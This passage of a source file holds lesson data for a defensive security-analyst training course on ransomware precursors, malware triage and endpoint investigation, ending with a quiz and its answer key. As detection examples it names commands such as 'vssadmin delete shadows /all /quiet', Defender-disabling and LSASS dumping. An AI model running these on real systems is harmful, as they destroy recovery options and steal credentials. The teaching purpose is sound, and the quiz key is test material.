            "--- ANALYST NOTES ---\n"
            "1. The source is an unsigned executable in Temp, not a "
            "security product.\n"
            "2. Its ancestry runs back to w3wp.exe: a web server process "
            "spawning commands suggests a web shell on this server "
            "(T1505.003).\n"
            "3. The full-access mask plus a new dump file two seconds later"
            " strongly matches T1003.001 (Credential Access).\n"
            "4. Scope: every account that had a session on SRV-APP-02 may "
            "be exposed, including administrators. Reset after containment,"
            " not before.\n"
            "5. Next: isolate, preserve the dump file and the web root, "
            "list logons to this host, and look for those accounts logging "
            "in elsewhere (4624 type 3 or 10).",
      ),
      LessonSection(
        heading: "Ransomware Precursors: The Warning Window",
        body:
            "Ransomware rarely starts with encryption. Encryption is the "
            "final step of an intrusion that has usually been under way for"
            " hours or days, often longer. That earlier period is your "
            "window to catch and stop it. Common precursors, roughly in "
            "order, include:",
        bullets: [
          "Initial access: phishing, exposed remote services, stolen "
          "credentials or a vulnerable internet-facing system. T1566, "
          "T1133, T1190.",
          "Discovery: net, nltest, whoami, ipconfig, and network "
          "scanners. T1087 (Account Discovery), T1018 (Remote System "
          "Discovery), T1082 (System Information Discovery).",
          "Credential access: the dumping covered earlier.",
          "Lateral movement: remote services, SMB admin shares, remote "
          "execution tools. T1021.001 (RDP), T1021.002 (SMB/Windows Admin"
          " Shares), T1569.002.",
          "Defense evasion: stopping or uninstalling security tools, "
          "clearing logs. T1562.001, T1070.001.",
          "Staging and exfiltration: archives created with 7-Zip or "
          "similar, large uploads to unusual destinations. T1560 (Archive"
          " Collected Data), T1567 (Exfiltration Over Web Service).",
          "Backup and recovery sabotage: deleting shadow copies and "
          "backups. T1490 (Inhibit System Recovery, Impact).",
          "Encryption: mass file modification with a new extension, "
          "ransom notes. T1486 (Data Encrypted for Impact, Impact).",
        ],
      ),
      LessonSection(
        heading: "Commands That Signal the Final Stage",
        body:
            "Some command lines are so closely linked to ransomware "
            "preparation that they deserve immediate escalation when they "
            "appear outside a known maintenance task.",
        bullets: [
          "vssadmin delete shadows, wmic shadowcopy delete, or "
          "Get-WmiObject Win32_ShadowCopy followed by Delete: removes "
          "shadow copies (T1490).",
          "bcdedit with settings that disable recovery or ignore "
          "failures: prevents safe recovery boot.",
          "wbadmin delete catalog or similar backup deletion.",
          "Mass stopping of services such as database, backup and "
          "security services, often through net stop or sc stop (T1489, "
          "Service Stop).",
          "Disabling Windows Defender through Set-MpPreference or "
          "registry changes (T1562.001).",
          "Large numbers of file renames or writes by a single process in"
          " a short time, visible as a spike in Sysmon 11 events or EDR "
          "file modification telemetry.",
          "Ransom note files (README or similar text, HTML or image "
          "files) appearing in many folders.",
        ],
      ),
      LessonSection(
        heading: "Annotated Escalation Timeline",
        isTemplate: true,
        body:
            "Fictional timeline, host group FS-01 and FS-02 (file servers):\n"
            "\n"
            "02:11Z  4624 type 10 (RDP) to FS-01 from 192.0.2.88 using "
            "account svc-backup\n"
            "02:19Z  Sysmon 1: net.exe group \"Domain Admins\" /domain\n"
            "02:31Z  Sysmon 10: access to lsass.exe by procdump64.exe\n"
            "02:48Z  4624 type 3 to FS-02 using account adm-jlee "
            "(credentials from the dump)\n"
            "03:05Z  Sysmon 1: 7z.exe a -p**** D:\\share\\hr.7z (archive of "
            "HR share)\n"
            "03:22Z  Sysmon 3: 7z archive upload, 203.0.113.9:443, 1.8 GB\n"
            "03:51Z  Defender service stopped; Set-MpPreference exclusions "
            "added\n"
            "04:02Z  Sysmon 1: vssadmin.exe delete shadows /all /quiet\n"
            "04:09Z  Mass file renames (.locked) begin\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Roughly two hours separate remote login from encryption. "
            "Any one step could have triggered containment.\n"
            "2. A service account with RDP rights is the entry point. "
            "Review who can use RDP and why.\n"
            "3. The earliest strong signal is the LSASS access at 02:31Z. "
            "The earliest suspicious one is the unusual RDP login at "
            "02:11Z.\n"
            "4. Lesson: act on precursors, not on ransom notes. If you see "
            "two or three of these stages linked, escalate as a potential "
            "ransomware incident immediately.",
      ),
      LessonSection(
        heading: "What to Check First",
        body:
            "When you see a single credential or ransomware precursor "
            "alert, widen the view quickly.",
        bullets: [
          "Which accounts had sessions on this host in the past day? "
          "Treat all of them as potentially exposed.",
          "Where did the suspicious account log in next? Search 4624 for "
          "that account across hosts and logon types.",
          "Is a backup, domain controller or file server in the picture? "
          "Priority rises sharply for these.",
          "Are security tools still reporting from the host? Silence plus"
          " preceding precursors is urgent.",
          "Who needs to be told now: incident lead, IT operations, and "
          "whoever owns the business system?",
        ],
      ),
      LessonSection(
        heading: "Account Signals in the Security Log",
        body:
            "Credential theft usually shows up twice: once on the host "
            "where the secret was taken and once where it is used. The "
            "second place is often easier to catch because the Security log"
            " records logons by account, source and type. Compare the use "
            "of an account with its habit.",
        bullets: [
          "A privileged account logging on from a workstation it never "
          "uses, or at a time outside its pattern.",
          "One account with logons to many hosts in a short time (type 3 "
          "network or type 10 RDP), which looks like movement rather than"
          " work.",
          "Many 4625 failures followed by a 4624 success: password "
          "guessing that worked (T1110).",
          "A service account used interactively. Service accounts "
          "normally log on as type 5 or type 3 from fixed places.",
          "New accounts or group changes (4720, 4732) near the same time,"
          " which can mean the attacker is building a second way in.",
          "A spike in Kerberos service ticket requests (4769) from one "
          "account for many services, which can be Kerberoasting "
          "(T1558.003).",
        ],
      ),
      LessonSection(
        heading: "Common Mistakes",
        body:
            "Typical errors in this stage of an investigation:",
        bullets: [
          "Resetting a password immediately, which tips off the attacker "
          "before you have scoped what they hold and while they still "
          "have other footholds.",
          "Treating an LSASS alert from a security product as an attack "
          "without checking the baseline, or dismissing it as noise "
          "without checking the source path.",
          "Looking at only one host. Credential theft means the next hop "
          "is on another machine.",
          "Waiting for encryption to start before escalating.",
          "Isolating the encrypting host and forgetting the systems that "
          "were used to reach it.",
        ],
      ),
    ],
  ),
  Lesson(
    title: "Malware Triage Basics",
    estimatedMinutes: 17,
    difficulty: LessonDifficulty.intermediate,
    sections: [
      LessonSection(
        heading: "What Triage Means Here",
        body:
            "Malware triage is a fast, safe, first-pass look at a "
            "suspicious file to decide what it probably is, how urgent the "
            "situation is and what to do next. It is not reverse "
            "engineering. A junior analyst is not expected to unpack a "
            "sample line by line. You are expected to gather enough facts "
            "to make a sound decision, handle the file without hurting "
            "yourself or the company, and pass useful indicators to "
            "responders.\n"
            "\n"
            "A good triage answers four questions: What is this file? Did "
            "it run, and where? What does it appear to do? Who else is "
            "affected? Everything in this lesson is aimed at those "
            "questions.",
      ),
      LessonSection(
        heading: "Safe Handling Rules",
        body:
            "Treat every suspicious file as live. Most compromises of "
            "analysts happen through carelessness, not sophistication.",
        bullets: [
          "Never open or double-click a sample on your normal work "
          "computer. Use an isolated analysis environment, such as a "
          "virtual machine with no shared folders, no clipboard sharing "
          "and a snapshot you can revert.",
          "Keep the sample in a password-protected archive when storing "
          "or moving it. A common convention is a zip with a simple "
          "agreed password, which stops mail gateways and antivirus from "
          "deleting it and stops accidental execution.",
          "Defang indicators in notes and tickets so they cannot be "
          "clicked: hxxps://bad-site[.]example, user[@]example.",
          "Do not upload files that contain customer or company data to "
          "public services. Uploaded files can be seen by others. Check "
          "the hash first, and follow your organization's policy on what "
          "may be shared.",
          "Record the original file name, path, size, time, and where it "
          "came from before you touch it. Work on a copy and keep the "
          "original untouched.",
          "Never run a sample on a network connected to production "
          "systems.",
        ],
      ),
      LessonSection(
        heading: "Hashes: The File's Fingerprint",
        body:
            "A cryptographic hash turns a file into a short fixed-length "
            "string. Change one byte and the hash changes completely. The "
            "common ones are MD5, SHA-1 and SHA-256. Prefer SHA-256, "
            "because MD5 and SHA-1 have known collision weaknesses, though "
            "you will still see them in older reports.\n"
            "\n"
            "Hashes are valuable because they let you compare without "
            "sharing the file. You can search your EDR for the same hash on"
            " other hosts, look it up in reputation services such as "
            "virustotal.com, and note it in the ticket so another analyst "
            "can find the same file. The limit is that any recompile or "
            "repack changes the hash, so a not-found result means 'not "
            "known', not 'safe'. A brand-new variant has no history.",
        bullets: [
          "Compute with sha256sum on Linux, Get-FileHash on Windows "
          "PowerShell, or certutil -hashfile.",
          "A fuzzy hash such as ssdeep or TLSH can match files that are "
          "similar but not identical.",
          "Lookup results show detection counts, first-seen dates, names "
          "and related files. Read the context, not only the score.",
          "A file with no detections, first seen today, in a user folder,"
          " started by Word, is not clean. It is unknown.",
        ],
      ),
      LessonSection(
        heading: "Static Analysis: Looking Without Running",
        body:
            "Static analysis examines a file without running it. It is the "
            "safest first step and often enough for triage.",
        bullets: [
          "File type: do not trust the extension. Check the real type "
          "with the file command or a hex view. A .jpg that starts with "
          "MZ is a Windows executable.",
          "Metadata: size, timestamps, version information, signer and "
          "certificate. For Office files, check macros and embedded "
          "objects with tools such as olevba from the oletools suite.",
          "Strings: readable text pulled from a binary, using the strings"
          " utility. URLs, IP addresses, file paths, registry keys, "
          "command names and error messages give clues.",
          "PE header details for Windows executables: imports (which "
          "system functions it calls), sections, and entropy. Very high "
          "entropy suggests packing or encryption.",
          "Pattern matching: YARA rules describe text or byte patterns "
          "that identify malware families, and many are shared openly. "
          "Check current availability of rule sets, and test before "
          "relying on them.",
          "Decoding: CyberChef is useful for Base64, hex, XOR and similar"
          " quick transformations of embedded data.",
        ],
      ),
      LessonSection(
        heading: "Annotated Static Triage Notes",
        isTemplate: true,
        body:
            "Sample:      invoice_4471.docm  (from mrao Downloads)\n"
            "Size:        48,213 bytes\n"
            "Type:        Microsoft Word 2007+ with macros (checked with "
            "file)\n"
            "SHA-256:     <64 hex characters>\n"
            "VT lookup:   not found (hash unknown)\n"
            "\n"
            "olevba output:\n"
            "  AutoOpen       -> runs on open\n"
            "  Shell, CreateObject(\"WScript.Shell\")\n"
            "  Chr() string building, long hex string\n"
            "\n"
            "Strings:\n"
            "  hxxps://cdn-files[.]example/a/p.bin\n"
            "  powershell -w hidden\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Unknown hash is neutral, not good news. The file is "
            "probably new or custom.\n"
            "2. Auto-run macro with shell creation and string obfuscation "
            "matches malicious macro behavior (T1204.002, T1059.005, "
            "T1027).\n"
            "3. The extracted URL gives an indicator to block and search "
            "across proxy and DNS logs.\n"
            "4. Confidence: high that the file is malicious, based on "
            "behavior, not on a vendor score.\n"
            "5. Next: check whether it ran on any host (Sysmon 1 with the "
            "parent WINWORD.EXE), and find all recipients of the original "
            "email.",
      ),
      LessonSection(
        heading: "Dynamic Analysis and Sandboxes",
        body:
            "Dynamic analysis runs the file and watches what it does. A "
            "sandbox does this automatically in a controlled virtual "
            "environment and produces a report. Many email security tools, "
            "EDR products and online services include one. Free or "
            "self-hosted sandboxes exist; check current availability and "
            "licensing.\n"
            "\n"
            "Sandboxes are excellent for speed and poor for certainty. A "
            "clean report does not mean the file is safe.",
        bullets: [
          "Evasion: malware may detect virtual machines, wait before "
          "acting, check for user activity or required files, or run only"
          " on certain locales or domains. A sandbox that never triggers "
          "the payload can produce a quiet report.",
          "Missing inputs: a document might need a password, a click, a "
          "specific language setting, or an internet resource that is "
          "gone. The sample may then do nothing.",
          "Timeouts: many reports cover only a few minutes of runtime.",
          "Network: if the sandbox blocked internet access, a downloader "
          "will fail and appear harmless.",
          "Environment: the sandbox's operating system and software may "
          "not match the target, so exploit-dependent behavior is not "
          "triggered.",
        ],
      ),
      LessonSection(
        heading: "Reading a Sandbox Verdict",
        body:
            "Do not just read the score. Read the evidence under the score."
            " A good approach is to scan the report in a set order.",
        bullets: [
          "Verdict and score: treat as a hint. Note which engine or rule "
          "produced it.",
          "Process tree: look for the chain you learned in earlier "
          "lessons. Document to shell to download is far more informative"
          " than a number.",
          "Network: contacted domains, IP addresses, URLs, and user "
          "agents. These become indicators.",
          "Files and registry: dropped files, hashes of dropped files, "
          "persistence keys, scheduled tasks.",
          "Mapped techniques: ATT&CK tags help you describe behavior, but"
          " verify that each tag is backed by an observed action.",
          "Screenshots: show if the sample displayed a decoy document or "
          "an installer window.",
          "Limits: did it run to completion? Was the network on? Any "
          "'analysis failed' or 'no behavior observed' messages?",
        ],
      ),
      LessonSection(
        heading: "Annotated Sandbox Report",
        isTemplate: true,
        body:
            "Report summary (fictional sandbox)\n"
            "  Score:      7/10   Verdict: Suspicious\n"
            "  OS:         Windows 10, Office 2019, internet allowed, run "
            "time 4 minutes\n"
            "\n"
            "  Process tree\n"
            "    WINWORD.EXE -> cmd.exe -> powershell.exe\n"
            "  Network\n"
            "    cdn-files.example (203.0.113.45) TCP 443, GET /a/p.bin  ->"
            " 200\n"
            "  Dropped files\n"
            "    %APPDATA%\\update.dll  SHA-256 <hash>  (not previously "
            "seen)\n"
            "  Registry\n"
            "    HKCU\\...\\Run\\OneDriveUpdater created\n"
            "  Tags\n"
            "    T1204.002, T1059.001, T1547.001, T1105\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. The score says 'Suspicious', not 'Malicious', but the "
            "behavior is clear: macro launches PowerShell, downloads a DLL,"
            " installs persistence. Rate it on the behavior.\n"
            "2. Take from the report: URL, domain, IP, dropped file hash "
            "and registry key. Search each in your telemetry.\n"
            "3. The report cannot tell you whether the real victim ran it. "
            "Confirm in endpoint logs.\n"
            "4. The second stage (the DLL) was only downloaded, not "
            "analyzed. Request deeper analysis from the malware team if "
            "needed.\n"
            "5. A lower score does not lower the response. Containment "
            "depends on whether it ran in your environment.",
      ),
      LessonSection(
        heading: "Common Mistakes",
        body:
            "Mistakes that appear again and again in malware triage:",
        bullets: [
          "Treating 'no detections' or 'not found' as safe.",
          "Running a sample on a work laptop 'just to see'.",
          "Uploading a sensitive document to a public sandbox without "
          "checking policy.",
          "Relying on the score without reading the process tree or the "
          "network section.",
          "Collecting indicators but never searching for them across the "
          "environment.",
          "Forgetting to record the hash and original location before "
          "moving the sample.",
          "Confusing the sandbox environment with the victim environment "
          "and drawing conclusions about the victim's machine.",
        ],
      ),
    ],
  ),
  Lesson(
    title: "Endpoint Investigation Workflow and Evidence",
    estimatedMinutes: 18,
    difficulty: LessonDifficulty.advanced,
    sections: [
      LessonSection(
        heading: "From Alert to Decision",
        body:
            "Previous lessons gave you pieces: telemetry, process trees, "
            "suspicious commands, credentials and malware triage. This "
            "lesson joins them into a repeatable workflow. A workflow "
            "matters because stress and noise make people skip steps. "
            "Following the same order every time keeps your decisions "
            "defensible and your handoffs clean.\n"
            "\n"
            "The outline below follows the usual incident phases: validate,"
            " scope, contain, collect, and hand over for eradication and "
            "recovery. In a small team you may do most of these yourself. "
            "In a larger one you may hand off after the first few. Know "
            "your own runbook and escalation path, and use this as a guide "
            "to what good looks like.",
      ),
      LessonSection(
        heading: "Step 1: Validate the Alert",
        body:
            "Decide whether this is a true positive, a false positive or "
            "still unknown. Gather the minimum evidence quickly.",
        bullets: [
          "Read the alert's logic. Why did it fire, and on what data?",
          "Capture the process, parent, command line, user, host, time "
          "and hash.",
          "Compare with a baseline: is this software, user and behavior "
          "normal here? Check the asset record and any open change "
          "tickets.",
          "Check for corroborating signals: a second detection, DNS or "
          "proxy events, or other hosts with the same indicator.",
          "Record your reasoning. 'Closed as false positive because the "
          "process is the approved backup agent, signed, in its normal "
          "path, parent services.exe, change CHG-1042' is a good note. "
          "'Looks fine' is not.",
        ],
      ),
      LessonSection(
        heading: "Step 2: Scope the Incident",
        body:
            "Scoping answers how far this goes. Work outward from the first"
            " confirmed host.",
        bullets: [
          "Pivot on indicators: hash, file name, destination domain and "
          "IP, command line fragments, registry key or task name.",
          "Pivot on identity: where else did this user or any compromised"
          " account log in? Look at 4624 by account and logon type, and "
          "VPN or cloud sign-ins.",
          "Pivot on time: what else happened on the host before the first"
          " alert? The earliest event you can find marks the likely "
          "start.",
          "Identify the entry point: email, download, remote service, "
          "vulnerable application or removable media.",
          "Rate impact: data on the host, privileges of the accounts, "
          "systems reachable from it.",
          "Keep a running list of confirmed, suspected and cleared hosts.",
        ],
      ),
      LessonSection(
        heading: "Step 3: Contain, Carefully",
        body:
            "Containment limits damage while keeping evidence and options "
            "open. The choice depends on risk, and some options need "
            "approval.",
        bullets: [
          "Network isolation through EDR: blocks most traffic but keeps "
          "the console connection, so you can still collect and run "
          "commands. Usually the preferred first move for a likely "
          "compromise.",
          "Disable or restrict the account, or require re-authentication,"
          " after scoping so that you act on all exposed accounts "
          "together.",
          "Block indicators at the proxy, DNS and firewall: domains, IPs "
          "and hashes.",
          "Kill a process or remove a scheduled task only after you have "
          "recorded it. Killing a process can lose volatile evidence.",
          "Do not power off a machine casually. Powering off loses "
          "memory, running processes and network connections. If you "
          "must, document why.",
          "Servers and business-critical systems: coordinate with the "
          "owner. Isolation may stop a service. Follow the runbook and "
          "escalate for approval when needed.",
        ],
      ),
      LessonSection(
        heading: "Step 4: Collect Evidence in Order of Volatility",
        body:
            "Evidence disappears at different speeds. Collect the "
            "quickest-fading data first.",
        bullets: [
          "Memory and running state: processes, network connections, "
          "logged-in users, loaded modules. Captured with approved tools "
          "such as an EDR live response feature, Velociraptor or a memory"
          " acquisition tool. Check current availability and your policy.",
          "Disk artifacts: files of interest, prefetch, scheduled task "
          "and registry files, browser history, event logs. Record the "
          "path and hash of each item.",
          "Logs: export the relevant Windows, Sysmon and PowerShell logs "
          "from the host before they roll over, and pull SIEM and EDR "
          "data for the same window.",
          "Network data: proxy, DNS, firewall, and any packet captures.",
          "Email and cloud sources: the original message, sign-in logs "
          "and audit trails.",
          "Chain of custody: who collected it, when, from where, how, and"
          " where it is stored. Hash each file at collection and again "
          "when handed over.",
        ],
      ),
      LessonSection(
        heading: "Annotated Evidence Log",
        isTemplate: true,
        body:
            "CASE:   IR-2026-1187   Host: WKS-FIN-014   Analyst: A. Nair "
            "(fictional)\n"
            "\n"
            "Time (UTC)   Action                                    Item / "
            "Result\n"
            "09:41        EDR network isolation applied              "
            "console confirmed, host reachable by console only\n"
            "09:48        Live response: process list, connections    "
            "pslist_0948.json  SHA-256 <hash>\n"
            "09:55        Memory image captured via approved tool     "
            "WKS-FIN-014.mem  8 GB  SHA-256 <hash>\n"
            "10:07        Copied update.dll, sync.ps1, invoice_4471.docm\n"
            "             to evidence share (read-only)               3 "
            "files, SHA-256 recorded for each\n"
            "10:14        Exported Sysmon, Security, PowerShell logs   3 "
            ".evtx files, hashes recorded\n"
            "10:20        Task SyncCheck XML and Run key value saved   2 "
            "text files\n"
            "10:26        Original email retrieved from mail gateway   "
            "invoice_4471_orig.eml\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Isolation came first, then volatile data, then files. That "
            "order follows volatility.\n"
            "2. Every item has a time, an action and a hash. That is what "
            "lets another person trust and reproduce your work.\n"
            "3. Originals are copied, not altered. Analysis is done on "
            "copies.\n"
            "4. Persistence is recorded before removal; removal is a later "
            "eradication step.",
      ),
      LessonSection(
        heading: "Step 5: Eradicate, Recover and Hand Over",
        body:
            "Your role in these steps depends on your organization, but you"
            " should understand them.",
        bullets: [
          "Eradication: remove persistence, malware and attacker accounts"
          " across all affected hosts, after you are confident of the "
          "full scope. A partial clean-up invites a return.",
          "Rebuild versus clean: for serious compromises, reimaging from "
          "a known-good source is often safer than trying to clean in "
          "place. The decision belongs to the incident lead.",
          "Credential resets: reset exposed accounts, privileged accounts"
          " and service accounts, and revoke sessions and tokens. Reset "
          "after containment so that the attacker cannot use the new "
          "passwords.",
          "Recovery: restore from backups you have verified are clean, "
          "and watch the rebuilt systems closely for returning "
          "indicators.",
          "Lessons learned: note the detection gap, the missing logs, the"
          " control that would have blocked it. These become "
          "improvements.",
        ],
      ),
      LessonSection(
        heading: "Writing the Endpoint Findings Note",
        body:
            "A short, structured note beats a long story. This template "
            "works for handoffs and tickets.",
        bullets: [
          "Summary: one or two sentences with the verdict and confidence.",
          "Timeline: UTC times, with the source for each entry.",
          "Evidence: what you collected, where it is stored, and the "
          "hashes.",
          "Indicators: hashes, domains, IPs, file paths, registry keys, "
          "task names (defanged).",
          "Impact and scope: confirmed, suspected and cleared hosts and "
          "accounts.",
          "Actions taken and still needed: with owner and time.",
          "Uncertainty: say plainly what you could not confirm and why.",
        ],
      ),
      LessonSection(
        heading: "Annotated Handoff Note",
        isTemplate: true,
        body:
            "Subject: IR-2026-1187 WKS-FIN-014 confirmed malicious macro, "
            "contained\n"
            "\n"
            "Summary: Confirmed compromise of WKS-FIN-014 (user mrao) "
            "through a malicious macro document received by email. High "
            "confidence. Host isolated at 09:41Z.\n"
            "\n"
            "Timeline (UTC):\n"
            "  09:12  Email delivered to 3 recipients (gateway log)\n"
            "  09:14  WINWORD.EXE spawned cmd.exe then powershell.exe "
            "(Sysmon 1)\n"
            "  09:15  Download from cdn-files[.]example, 203.0.113.45 "
            "(Sysmon 3, 22)\n"
            "  09:16  Run key and scheduled task created (Sysmon 13, 4698)\n"
            "\n"
            "Scope: 1 host confirmed. 2 other recipients; 1 opened the file"
            " (WKS-HR-007, under review). No credential access seen on "
            "WKS-FIN-014 in available logs.\n"
            "\n"
            "Indicators: cdn-files[.]example; 203.0.113.45; SHA-256 values "
            "in the evidence log.\n"
            "\n"
            "Needed: remove persistence on WKS-FIN-014 after image; check "
            "WKS-HR-007; block domain and IP; password reset for mrao after"
            " scoping.\n"
            "\n"
            "Not confirmed: whether the DLL accessed any files or contacted"
            " other hosts. Memory image is available for deeper analysis.\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. The first line has the verdict and the confidence.\n"
            "2. Facts and judgments are separated: what was seen versus "
            "what is still open.\n"
            "3. Uncertainty is stated, not hidden.\n"
            "4. The reader can act without opening the whole case.",
      ),
      LessonSection(
        heading: "Habits of a Good Analyst",
        body:
            "These habits matter more than any single tool.",
        bullets: [
          "Start with the question: what decision does this evidence "
          "support?",
          "Read the process tree before the verdict score.",
          "Record command lines, times and hashes as you go, not "
          "afterward.",
          "Work in UTC and note the source of each fact.",
          "Question the name, trust the path, signer and behavior.",
          "Widen the search: one host is rarely the whole story.",
          "Preserve before you clean: evidence first, removal second.",
          "Say what you do not know. A clearly marked gap is better than "
          "a confident guess.",
          "Escalate early when stages chain together; do not wait for "
          "encryption.",
          "Keep your own environment safe: analysis only in isolated "
          "systems, with defanged indicators.",
        ],
      ),
      LessonSection(
        heading: "Quick Checklist for the Shift",
        isTemplate: true,
        body:
            "Host, user, time, process, parent, command line.\n"
            "Path, signer, hash, prevalence.\n"
            "Network and DNS from the process.\n"
            "Files, registry, tasks and services created.\n"
            "Other hosts, other accounts, other recipients.\n"
            "Isolate if justified; record before you remove.\n"
            "Collect volatile data first; hash everything.\n"
            "Write the note: verdict, timeline, scope, actions, gaps.",
      ),
    ],
  ),
  Lesson(
    title: "Practice Test: Endpoint & Malware Triage",
    estimatedMinutes: 10,
    difficulty: LessonDifficulty.intermediate,
    quiz: [
      QuizQuestion(
        question: "An alert shows powershell.exe with an encoded command. Which "
                  "detail most strengthens the case that it is malicious rather "
                  "than administrative?",
        options: [
          "The binary is located in the System32 folder on the host",
          "The command was run by a standard user account today",
          "The process ended a few seconds after it was started",
          "Its parent is WINWORD.EXE, opening a downloaded file",
        ],
        correctIndex: 3,
        explanation:
            "Office applications launching a script engine is a rare, "
            "high-signal pairing. The System32 path does not help, because "
            "the real PowerShell binary is expected there and attackers "
            "abuse it.",
      ),
      QuizQuestion(
        question: "You expected command lines in Security log process events but "
                  "only see process names. What is the most likely cause?",
        options: [
          "Sysmon was uninstalled from the machine during the attack",
          "The audit policy for command line capture is not enabled",
          "The user is not a member of the local administrators group",
          "The host clock is out of sync with the domain controller",
        ],
        correctIndex: 1,
        explanation:
            "Event 4688 carries the command line only when that policy is "
            "turned on. Sysmon is a separate source and is not needed for "
            "4688 to exist.",
      ),
      QuizQuestion(
        question: "Which Sysmon event would you check first to learn which "
                  "process made a specific DNS lookup?",
        options: [
          "Event ID 22, which logs DNS queries by process",
          "Event ID 11, file creation in a monitored directory",
          "Event ID 13, registry value set by a running process",
          "Event ID 1, process creation with the full command line",
        ],
        correctIndex: 0,
        explanation:
            "Event 22 records the query together with the process that "
            "issued it. Event 1 shows how a process started, not what names"
            " it resolved.",
      ),
      QuizQuestion(
        question: "svchost.exe is running from C:\\Users\\Public, with explorer.exe"
                  " as its parent and no -k argument. What is the best "
                  "description?",
        options: [
          "A signed system file that the user moved to a new folder",
          "A harmless duplicate of a service host that can be ignored",
          "Likely masquerading, as its path and parent are wrong",
          "Normal behavior that appears after a Windows update runs",
        ],
        correctIndex: 2,
        explanation:
            "Genuine service hosts run from System32 and are started by "
            "services.exe. A matching name alone proves nothing.",
      ),
      QuizQuestion(
        question: "Sysmon shows an unsigned file in C:\\Windows\\Temp opening "
                  "lsass.exe with full access, and a 200 MB .dmp file appears "
                  "seconds later. Which technique fits best?",
        options: [
          "T1486, Data Encrypted for Impact on the local disk",
          "T1003.001, OS Credential Dumping of LSASS memory",
          "T1110, Brute Force against local account passwords",
          "T1053.005, Scheduled Task used for persistence",
        ],
        correctIndex: 1,
        explanation:
            "Process access to LSASS followed by a dump file is the classic"
            " LSASS dumping pattern. Encryption for impact would look like "
            "mass file modification, not one memory dump.",
      ),
      QuizQuestion(
        question: "At 4 a.m. an unfamiliar process on a file server runs vssadmin"
                  " delete shadows /all /quiet. What should you do?",
        options: [
          "Add the process to the allow list and keep watching it",
          "Wait for a second alert before treating it as an incident",
          "Close it as routine backup maintenance without more checks",
          "Escalate as a likely ransomware precursor and contain",
        ],
        correctIndex: 3,
        explanation:
            "Deleting shadow copies removes recovery options and often "
            "comes shortly before encryption, so waiting can cost the data."
            " Calling it maintenance needs a change record, not an "
            "assumption.",
      ),
      QuizQuestion(
        question: "A host has a new Run key named OneDriveUpdater that starts "
                  "rundll32.exe with a DLL from AppData\\Roaming. Which conclusion"
                  " is best?",
        options: [
          "Unimportant, because Run keys only affect a single user "
          "profile",
          "A normal sign that a Microsoft update is still in progress",
          "Suspicious persistence, as the name copies a product",
          "Probably legitimate, since the name refers to a known product",
        ],
        correctIndex: 2,
        explanation:
            "Names are chosen to blend in, so the action and path decide "
            "the verdict. A per-user key still survives reboots and keeps "
            "the attacker in that profile.",
      ),
      QuizQuestion(
        question: "You confirm credential dumping on an application server. What "
                  "is the best action before you reset any passwords?",
        options: [
          "Isolate the host, keep evidence and list exposed accounts",
          "Reset every domain account at the same time right away",
          "Delete the dump file so the stolen data is no longer exposed",
          "Ask the signed-in user to log off and log on again",
        ],
        correctIndex: 0,
        explanation:
            "Scoping first shows which accounts to reset and avoids "
            "alerting the attacker while other footholds remain. Deleting "
            "the dump destroys evidence and does not undo the theft.",
      ),
      QuizQuestion(
        question: "Which PowerShell log gives the clearest view of code that ran "
                  "after obfuscation was removed?",
        options: [
          "Security event 4624, which records successful logons",
          "Sysmon event 3, which records network connections",
          "System event 7045, which records new service installs",
          "Script block logging, event 4104, the code that ran",
        ],
        correctIndex: 3,
        explanation:
            "Event 4104 stores the script text PowerShell processed, often "
            "readable. Logon, service and network events give context but "
            "not code.",
      ),
      QuizQuestion(
        question: "A sandbox report scores a suspicious macro document 1/10 and "
                  "shows no network activity. What is the best interpretation?",
        options: [
          "The score proves that the sender was a legitimate contact",
          "Inconclusive, since evasion can hide the real behavior",
          "The file only matters if it is seen again in a week",
          "The file is safe and can be released back to the user",
        ],
        correctIndex: 1,
        explanation:
            "Sandboxes can miss malware that detects virtual machines, "
            "waits, or needs a network or user input. A low score reflects "
            "what was observed, not what the file can do.",
      ),
      QuizQuestion(
        question: "A SHA-256 lookup on an email attachment returns not found. "
                  "What does that tell you?",
        options: [
          "The service has no record, so you need other evidence",
          "The hash is invalid and has to be computed a second time",
          "The file was checked by the service and found to be clean",
          "Only MD5 lookups work properly for brand-new samples",
        ],
        correctIndex: 0,
        explanation:
            "Unknown means no history, which is common for new or custom "
            "malware. Treating it as clean confuses not found with benign.",
      ),
      QuizQuestion(
        question: "What is the safest way to examine a suspicious executable "
                  "taken from a user's laptop?",
        options: [
          "Run it on your own workstation with antivirus switched on",
          "Open it in a browser sandbox on a shared office computer",
          "Copy it into an isolated VM with no shared folders",
          "Upload it straight to any free public scanning website",
        ],
        correctIndex: 2,
        explanation:
            "Isolation and a revertible snapshot protect real systems and "
            "let you reset after a run. Antivirus on a work machine is not "
            "isolation, and public uploads can expose company data.",
      ),
      QuizQuestion(
        question: "Why is EDR network isolation usually preferred over powering "
                  "off a suspected host?",
        options: [
          "Isolation permanently removes the malware from the memory",
          "It blocks traffic but keeps memory and console access",
          "It stops the user from reporting the problem to the help desk",
          "Powered-off machines cannot be reimaged by the IT team",
        ],
        correctIndex: 1,
        explanation:
            "Powering off destroys volatile evidence such as running "
            "processes and connections. Isolation does not remove malware; "
            "it only cuts it off while you investigate.",
      ),
      QuizQuestion(
        question: "Which collection order follows the order of volatility on an "
                  "isolated host?",
        options: [
          "Reimage the host first, then export whatever logs remain",
          "Disk image first, then memory, then the list of running "
          "processes",
          "Memory first, then logs and files, then disk artifacts",
          "Event logs first, then memory, then network connections",
        ],
        correctIndex: 2,
        explanation:
            "The most volatile data disappears first, so it is gathered "
            "first. Reimaging early destroys the evidence you still need.",
      ),
    ],
  ),
];
